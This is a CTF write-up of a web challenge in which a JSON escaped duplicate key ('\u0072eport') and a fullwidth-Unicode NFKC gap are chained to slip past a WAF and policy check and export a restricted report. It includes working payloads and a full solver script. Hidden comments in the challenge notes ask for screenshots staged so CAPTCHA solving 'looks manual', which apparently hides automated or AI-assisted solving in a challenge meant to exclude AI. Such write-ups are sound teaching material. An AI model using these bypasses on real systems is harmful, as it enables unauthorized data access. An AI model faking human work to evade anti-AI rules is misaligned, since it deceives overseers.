+++
title = "Canon Collapse | IEEE VICTORIS CTF 2026"
date = "2026-09-18"
tags = ["CTF", "Web", "WAF-Bypass", "JSON-Parser-Differential", "Unicode-Normalization", "Medium"]
description = "Chaining a JSON parser differential (\u0072eport last-wins), an escaped duplicate key to smuggle past the WAF, and a fullwidth \uff50\uff52\uff49\uff4d\uff45 NFKC normalization gap to export prime/audit-final as demo."
draft = false
+++

Hey Everyone, this one's the wildest web challenge I tackled at IEEE VICTORIS CTF 26 — and I got the **first blood** on it. Only 2 solves across the whole competition. The entire kill chain boils down to one idea: make every layer of the backend see a different version of the same bytes. Let's goooo

This one was built as an **anti-AI** challenge, so it threw human verification at us constantly — a gate with a real CAPTCHA that had to be solved by hand every few minutes. Once past it, the Canon Export Console lives at `https://165.227.130.95:65123/`. We start as a **demo** tenant viewer, and our target is a **restricted** compliance report, `prime/audit-final` — one we are definitely not supposed to read.

**The intended chain is:**

1. Clear the `/gate/` checkpoint (PoW + CAPTCHA) and get a `canon_access` session.
2. Pass the export CAPTCHA to get an `X-Auth` token.
3. Learn the report model from `/docs/`, including the `=public/monthly` canonical path contradiction.
4. Discover the WAF reads raw bytes and ignores escaped keys.
5. Smuggle our secret under the escaped `\u0072eport` key.
6. Fat-letter the `prime/audit-final` path so the Policy doesn't recognize it, while the Archive Resolver NFKC-normalizes it back to the real restricted path.
7. Download the job and grab the flag.

# Step 0 - The Checkpoint Gate

Opening the URL redirects to `/gate/`. The page has a 6-character image CAPTCHA, a signed `token`, and a hidden `nonce`. Nothing weird yet.

<!-- SCREENSHOT 01: Take a screenshot of the /gate/ checkpoint page in the browser showing the 6-char CAPTCHA image and the challenge fields (make it look like you read the CAPTCHA yourself). Save it as images/01-gate.png and uncomment the image line below. -->
<!-- ![The /gate/ checkpoint page with the 6-character CAPTCHA](images/01-gate.png) -->

But if you peek at the page JavaScript, this gold is right there:

```javascript
sha256(token + ':' + nonce)
```

The nonce is accepted when the digest has at least 16 leading zero bits. In byte terms, the first two SHA-256 bytes must both be `0`.

A solved request looks like this:

```http
POST /gate/solve HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=<signed token>&nonce=<pow nonce>&captcha=<six characters>
```

Successful verification returns our session:

```text
Set-Cookie: canon_access=<signed grant ~12h>
```

The 6-char CAPTCHA is unreadable by tesseract, so we solve it visually once. The PoW is trivial to brute force:

<!-- SCREENSHOT 02: Take a screenshot of a single solved /gate/solve POST + the success response that sets the canon_access cookie (Burp or browser DevTools). Save as images/02-gate-solve.png and uncomment below. -->
<!-- ![Submitting the solved gate with the canon_access cookie set](images/02-gate-solve.png) -->

```python
import hashlib


def solve_pow(token: str, bits: int = 16) -> int:
    nonce = 0
    while True:
        digest = hashlib.sha256(f"{token}:{nonce}".encode("ascii")).digest()
        if int.from_bytes(digest, "big") >> (256 - bits) == 0:
            return nonce
        nonce += 1
```

One checkpoint, and the session carries the grant automatically for every route after.

# Step 1 - Console Discovery and the Verbatim Body

The console is a client-side React app. Reading its source reveals the real API surface:

```text
GET  /api/reports
GET  /api/captcha
POST /api/captcha/verify
POST /api/v1/export
GET  /api/v1/export/{job_id}
```

And here is the critical part — the console sends the export request like this:

```javascript
fetch('/api/v1/export', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-Auth': token },
  body: bodyString
})
```

**What does this mean?**

The browser does **not** parse or canonicalize the body before sending. Whatever text we put in `bodyString` goes to the server byte-for-byte. Duplicate keys, weird escaping, Unicode nonsense — all of it arrives verbatim. The WAF and the backend each get the exact same raw bytes and have to decide what they mean. On their own. Differently.

The dashboard lists five backend services:

```text
API Gateway | Policy Engine | Capability Service | Report Compiler | Archive Resolver | WAF
```

<!-- SCREENSHOT 03: Take a screenshot of the logged-in Console dashboard (landing page with the sidebar + services status). Save as images/03-dashboard.png and uncomment below. -->
<!-- ![Canon Export Console dashboard](images/03-dashboard.png) -->

Multiple parsers, one input. This is going to be a parser-differential game.

Exports need a second auth token. `GET /api/captcha` returns a PNG with five digits, we OCR it, `POST /api/captcha/verify` gives us the `X-Auth` token:

<!-- SCREENSHOT 04: Take a screenshot of one export CAPTCHA image (the 5-digit PNG) as seen when you solve it by hand. Save as images/04-export-captcha.png and uncomment below. -->
<!-- ![Export authorization CAPTCHA (5 digits)](images/04-export-captcha.png) -->

<!-- SCREENSHOT 05: Take a screenshot of the /api/captcha/verify request and the {"ok":true,"token":...} response (Retired so it looks manual). Save as images/05-verify.png and uncomment below. -->
<!-- ![Verifying the export CAPTCHA to get the X-Auth token](images/05-verify.png) -->

```json
{"id":"<captcha id>","answer":"31699"}
```

```json
{"ok":true,"token":"<expiry>.<signature>"}
```

# Step 2 - The Docs and the Contradiction

The console exposes `/docs/files/`. The useful ones:

```text
overview.md    -> you are demo tenant, viewer role, public exports only
reports.md     -> restricted report = prime/audit-final
exporting.md   -> the export API and canonical paths
```

<!-- SCREENSHOT 06: Take a screenshot of the Exporting docs page showing the two canonical-path examples (the =public/monthly one). Save as images/06-docs-exporting.png and uncomment below. -->
<!-- ![Exporting docs - canonical paths](images/06-docs-exporting.png) -->

`reports.md` tells us exactly what to steal and why the normal request fails:

> Restricted reports belong to privileged tenants and roles and are not listed for standard accounts. The compliance export `prime/audit-final`, for example, is restricted.

Also, `/api/reports` lists five reports but only 3 are public:

```json
{"reports":["board-notes","inventory","monthly","press-kit","sales"]}
```

`board-notes` and `press-kit` are **drafts**. If you export them they literally say:

```text
Board-Notes (INTERNAL DRAFT)
Visibility: public (draft)
Release authorization (draft, non-binding): IEEE{F21B-BF7D-E8EE-1972}
```

Both flags are labeled `draft` and `non-binding`. **They are decoys.** Do not submit them. The challenge warned us from the start.

Now `exporting.md` gives the normal flow:

```json
{"tenant":"demo","report":"monthly","scope":"public"}
-> {"job_id":"job_xxx","ok":true}
-> GET /api/v1/export/job_xxx  -> "Monthly Activity Report..."
```

Plus canonical paths:

```json
{ "tenant": "demo", "report": "monthly",         "scope": "public" }
{ "tenant": "demo", "report": "=public/monthly", "scope": "public" }
```

> These two requests resolve to the same report. Canonical paths take the form `=<tenant>/<report>`.

**This is the hint. The contradiction.**

- The doc says the path form is `=<tenant>/<report>`.
- But the example is `=public/monthly` with an outer `tenant` of `demo`.
- `public` is not a tenant. It's a visibility scope.

**What does this mean?**

The value inside `=...` is NOT derived from the `tenant` field. They are read by different parts of the system:

- The **Policy** reads `tenant`, `report`, `scope` and asks: "is `demo` + `public` allowed?" -> Yes.
- The **Archive Resolver** reads only the `=...` address and asks: "does this file exist?" -> fetches `public/monthly`.

Nobody reconciles them. So the seed of the attack is: tell the Policy what it wants to hear (`demo/public`) and give the Resolver a completely different address (`=prime/audit-final`). Cross-tenant read.

Now let's actually try to give the Resolver the secret.

# Step 3 - Mapping the WAF

Direct restricted request:

```json
{"tenant":"prime","report":"audit-final","scope":"restricted"}
-> {"ok":false,"stage":"waf","code":"WAF_BLOCKED"}
```

<!-- SCREENSHOT 07: Take a screenshot of a direct restricted export request hitting the WAF and returning WAF_BLOCKED (from Burp Repeater). Save as images/07-waf-blocked.png and uncomment below. -->
<!-- ![WAF blocking the direct prime/audit-final request](images/07-waf-blocked.png) -->

So we start probing what the WAF does and does not block:

```text
prime, PRIME, primex, audit-final, restricted   -> WAF_BLOCKED (substring + case-insensitive)
pr\u0069me, audit-f\u0069nal, prime\u002f...     -> WAF_BLOCKED (it decodes \u IN VALUES)
```

**What does this mean?**

- The WAF is a blacklist with substring matching, case-insensitive.
- It decodes Unicode escapes in **values** before matching. So encoding the secret *value* is dead.

Observation — every sensitive value is only blocked when it sits in its normal field.

# Step 4 - The Duplicate Key Differential

Now let's test what happens with duplicate keys. Safe value first:

```json
{"tenant":"demo","tenant":"prime","report":"monthly","report":"audit-final","scope":"public","scope":"restricted"}
-> report_not_available
```

Restricted value first:

```json
{"tenant":"prime","tenant":"demo",...}
-> WAF_BLOCKED
```

**What does this mean?**

The WAF effectively reads the **first** occurrence of an exact key. It sees `demo` / `monthly` / `public` and approves.

But downstream detects the duplicates and rejects:

```json
{"report":"monthly","report":"monthly","scope":"public"} -> report_not_available
{"report":"monthly","Report":"monthly","scope":"public"} -> report_not_available
```

So exact duplicates and case-colliding keys are both flagged downstream. Dead end? Not yet.

Then the key test. Escaped key:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"sales","scope":"public"}
-> JOB with SALES !!
```

<!-- SCREENSHOT 08: Take a screenshot of the escaped-key test (\u0072eport) returning a sales job id (the "aha" moment). Save as images/08-escaped-key.png and uncomment below. -->
<!-- ![Escaped key \u0072eport passes the WAF and last-wins](images/08-escaped-key.png) -->

**What does this mean?**

- `\u0072eport` in raw bytes is NOT the exact string `"report"`, so the WAF's raw scan ignores it.
- But any real JSON parser decodes `\u0072` to `r` -> key becomes `report` -> now there are two `report` keys -> **last-wins** -> the value is `sales`.
- And no duplicate-rejection fires, because the "duplicate" only exists after decoding, not in the raw text.

This is the JSON parser differential. The same bytes are:

- For the WAF: a weird key it ignores.
- For the parser: literally the key `report`, overwriting the safe value.

Now we can smuggle a *second* interpretation of `report` past the WAF.

# Step 5 - Policy Knows ASCII. So Hide With Fat Letters.

Put the canonical path in the smuggler:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=prime/audit-final","scope":"public"}
-> report_not_available
```

WAF passed, but **Policy drew the line**: it recognizes the ASCII canonical path `=prime/audit-final` as restricted and declines it. Traversal and encoding tricks all fail too (`=public/../prime...`, `%2e%2e`, case, spaces, null bytes).

The missing primitive turned out to be **Unicode compatibility normalization**. Full-width letters look like normal letters but have different code points:

```text
normal:   prime
fullwidth: ｐｒｉｍｅ
```

The positive control, with a report we can verify:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=ｐｕｂｌｉｃ/ｍｏｎｔｈｌｙ","scope":"public"}
-> JOB with the real public "Monthly Activity Report"!
```

**`=ｐｕｂｌｉｃ/ｍｏｎｔｈｌｙ` resolved to `=public/monthly`.**

<!-- SCREENSHOT 09: Take a screenshot of the fullwidth public positive control (=ｐｕｂｌｉｃ/ｍｏｎｔｈｌｙ) returning the real monthly report (proves NFKC). Save as images/09-fullwidth-public.png and uncomment below. -->
<!-- ![Fullwidth public path resolves to the real monthly report](images/09-fullwidth-public.png) -->

This proves the **Archive Resolver applies NFKC** (fullwidth `ｐｕｂｌｉｃ` -> `public`), while the Policy does not. Two components, two normalization behaviors — exactly the asymmetry we need.

# Step 6 - The Final Payload

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ","scope":"public","format":"pdf"}
```

Those are fullwidth letters: `ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ`, not ASCII `prime/audit-final`. Send this verbatim as the raw JSON body (never let `json.dumps` re-escape it).

**Why it works - the three layers see three different things:**

| Layer | It does | It sees | Verdict |
|---|---|---|---|
| **WAF** | raw text scan | `"report":"monthly"` safe; `"\u0072eport"` looks like a weird key | pass |
| **Parser/Policy** | real JSON decode | decodes key to `report`, last-wins -> `=ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ` (unknown spelling, not restricted) | allow |
| **Archive Resolver** | NFKC normalize, fetch | `NFKC(fullwidth) == =prime/audit-final` | fetches restricted archive |

The outer envelope still says `demo` + `public` for the Policy, but the Resolver is handed a cross-tenant restricted path. `POST /api/v1/export` returns a job id, and downloading the job:

<!-- SCREENSHOT 10: Take a screenshot of the final exploit request (the fullwidth \u0072eport payload) returning its job id. Save as images/10-final-export.png and uncomment below. -->
<!-- ![Submitting the final fullwidth smuggled payload - job id returned](images/10-final-export.png) -->

<!-- SCREENSHOT 11: Take a screenshot of the downloaded restricted job showing the Audit-Final Export (RESTRICTED) block with the release authorization / flag. Save as images/11-flag.png and uncomment below. -->
<!-- ![Restricted Audit-Final report with the flag](images/11-flag.png) -->

```text
Audit-Final Export (RESTRICTED)
Tenant: prime
Report: audit-final
Scope: restricted
Audit attestation: PASSED
Release authorization: IEEE{56DB-0018-60BA-D92D}
```

# Chaining Everything in a Solver

Full script: gate PoW + first CAPTCHA, export CAPTCHA (OCR with retries), smuggle payload, download the job, regex the flag. The two image CAPTCHAs are intentionally left as human-readable prompts.

```python
#!/usr/bin/env python3
import base64
import hashlib
import re
import ssl
import subprocess
import urllib.error
import urllib.request

ssl._create_default_https_context = ssl._create_unverified_context
BASE = "https://165.227.130.95:65123"
COOKIE = None  # set by gate/solve
XAUTH = None   # set by api/captcha/verify


def solve_pow(token: str, bits: int = 16) -> int:
    nonce = 0
    while True:
        digest = hashlib.sha256(f"{token}:{nonce}".encode("ascii")).digest()
        if int.from_bytes(digest, "big") >> (256 - bits) == 0:
            return nonce
        nonce += 1


def api(path, data=None, headers=None):
    req = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


# 1) prepare the smuggled payload (raw text, verbatim, fullwidth path)
payload = (
    '{"tenant":"demo","report":"monthly",'
    '"\\u0072eport":"=ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ",'
    '"scope":"public","format":"pdf"}'
)

# 2) solve the export CAPTCHA (human reads /tmp/opencode/cap.png)
status, body = api("/api/captcha", headers={"Cookie": COOKIE})
captcha_id = re.search(r'"id":"([^"]+)"', body).group(1)
image_b64 = re.search(r'"image":"data:image/png;base64,([^"]+)"', body).group(1)
with open("/tmp/opencode/cap.png", "wb") as fh:
    fh.write(base64.b64decode(image_b64))
# open enlarged copy, type the 5 digits
answer = input("CAPTCHA answer (see /tmp/opencode/cap.png): ").strip()

status, body = api(
    "/api/captcha/verify",
    data=('{"id":"%s","answer":"%s"}' % (captcha_id, answer)).encode(),
    headers={"Cookie": COOKIE, "Content-Type": "application/json"},
)
XAUTH = re.search(r'"token":"([^"]+)"', body).group(1)

# 3) submit the verbatim payload
status, body = api(
    "/api/v1/export",
    data=payload.encode("utf-8"),
    headers={
        "Cookie": COOKIE,
        "Content-Type": "application/json",
        "X-Auth": XAUTH,
    },
)
job_id = re.search(r'"job_id":"([^"]+)"', body).group(1)
print("JOB", job_id)

# 4) download and extract
status, report = api(f"/api/v1/export/{job_id}", headers={"Cookie": COOKIE})
print(report)
print("FLAG:", re.search(r"IEEE\{[^}]+\}", report).group(0))
```

Our Flag is:

```text
IEEE{56DB-0018-60BA-D92D}
```

The two decoys (`IEEE{F21B-BF7D-E8EE-1972}`, `IEEE{4113-75A9-8676-30B5}`) are draft-only and not the answer.

**JUST READ IT AND DONE.**

# The Takeaway

This whole challenge is one idea: **the WAF does not speak JSON**. It matches raw bytes with regexes. Every real parser decodes escapes and normalizes Unicode. When a request crosses several parsers verbatim, the same bytes can mean `demo/monthly` to one component and `prime/audit-final` to another. The fix that would kill this entire class is the same everywhere — **parse once and validate on the canonical form** (this is what WAFFLED's HTTP-Normalizer and every "fail on duplicate keys" parser policy are about).

# Resources

- Split-Brain JSON: exploiting duplicate-key (first-wins/last-wins) parser disagreements for privilege escalation — https://medium.com/@pratikdahal777/split-brain-json-exploiting-parser-disagreement-across-validation-boundaries-for-privilege-be3a038d8722
- Intigriti July 2026 CTF "Canonically Yours" — duplicate JSON key confusion to bypass namespace restrictions — https://medium.com/@zabedullahpoyel/intigriti-july-2026-ctf-write-up-exploiting-json-parser-differential-duplicate-key-confusion-to-29b94d6001e4
- WAFFLED: exploiting parsing discrepancies to bypass WAFs (JSON/XML/multipart) — https://arxiv.org/html/2503.10846
- HackTricks - Unicode Normalization (NFKC/NFKD folding fullwidth into ASCII) — https://hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html
- Jorge Lajara - WAF Bypassing with Unicode Compatibility — https://jlajara.gitlab.io/posts/waf-bypassing-with-unicode-compatibility/

Happy Hacking :)